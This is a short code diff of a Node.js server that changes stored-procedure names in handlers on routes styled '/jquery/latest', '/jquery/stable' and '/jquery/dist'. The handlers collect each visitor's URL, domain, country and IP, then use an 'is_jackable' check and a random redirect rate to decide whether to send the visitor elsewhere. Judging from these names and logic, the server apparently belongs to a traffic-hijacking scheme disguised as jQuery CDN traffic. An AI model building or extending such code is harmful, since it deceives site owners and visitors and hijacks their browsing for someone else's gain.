@@ -72,7 +72,7 @@ function getClientResponseJSON(uuid, url, ip, callback) {
 
     var response = "";
 
-    connection.query("select is_jackable_new(?,?,?) as redirect_rate;", [url, config.minimum_clicks_per_min, ip], function(err, docs) {
+    connection.query("select is_jackable(?,?,?) as redirect_rate;", [url, config.minimum_clicks_per_min, ip], function(err, docs) {
         if(docs[0]) {
             var redirect_rate = docs[0].redirect_rate;
             var randomNumber = Math.random() * 100;
@@ -202,7 +202,7 @@ app.post('/jquery/latest', function(req, res) {
     //console.log("Formatted url to be: " + url);
     //console.log("The domain of the url is: " + domain);
 
-    connection.query("select process_request_new(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
+    connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
         if(docs[0] != undefined) {
             var response_string = docs[0].value;
 
@@ -285,7 +285,7 @@ app.post('/jquery/stable', function(req, res) {
     //console.log("Formatted url to be: " + url);
     //console.log("The domain of the url is: " + domain);
 
-    connection.query("select process_request_new(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
+    connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
         if(docs[0] != undefined) {
             var response_string = docs[0].value;
 
@@ -371,7 +371,7 @@ app.post('/jquery/dist', function(req, res) {
     //console.log("Formatted url to be: " + url);
     //console.log("The domain of the url is: " + domain);
 
-    connection.query("select process_request_new(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
+    connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
         if(docs[0] != undefined) {
             var response_string = docs[0].value;
 
